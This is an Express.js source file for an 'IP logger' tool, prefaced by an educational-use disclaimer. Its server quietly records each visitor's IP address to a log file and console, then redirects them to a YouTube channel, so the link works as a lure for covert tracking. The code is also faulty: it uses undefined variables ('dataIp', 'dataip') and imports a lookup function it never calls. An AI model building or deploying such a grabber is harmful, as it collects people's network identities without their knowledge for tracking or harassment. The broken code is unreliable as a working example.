/*
logger hell by void

## ⚠️ Legal Disclaimer

This project is for **educational and research purposes only**.

The author is **not responsible** for any misuse, damage, or illegal activities caused by this code.  
**Use it at your own risk.**

> Unauthorized use against others may lead to **legal consequences** or **account bans**.

*/


const express = require("express");
const {getIpInfo} = require("./getIpInfo")
const fs = require("fs");
const app = express();
const port = 3000;

const link = "https://youtube.com/@void190y?si=5qpDPayfhCHHDGjL";



app.set("trust proxy", true);

console.clear();
console.log(`
   _                _
  | |    ___   __ _| | _____ _ __
  | |   / _ \\ / _\` | |/ / _ \\ '__|
  | |__| (_) | (_| |   <  __/ |
  |_____\\___/ \\__,_|_|\\_\\___|_|

============================
 😈 Logger HELL by void
============================
`);

app.get("/", (req, res) => {

  const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;


  fs.appendFile("log.txt", `${ip} \n ${dataIp}\n`, err => {
    if (err) {
      console.log("Erro ao salvar IP");
    }
  });
  console.log(ip,":entrou \n")
  console.log(dataip,"\n");


  res.redirect(302, link);
});

app.listen(port, () => {
  console.log("Logger rodando na porta " + port);
});
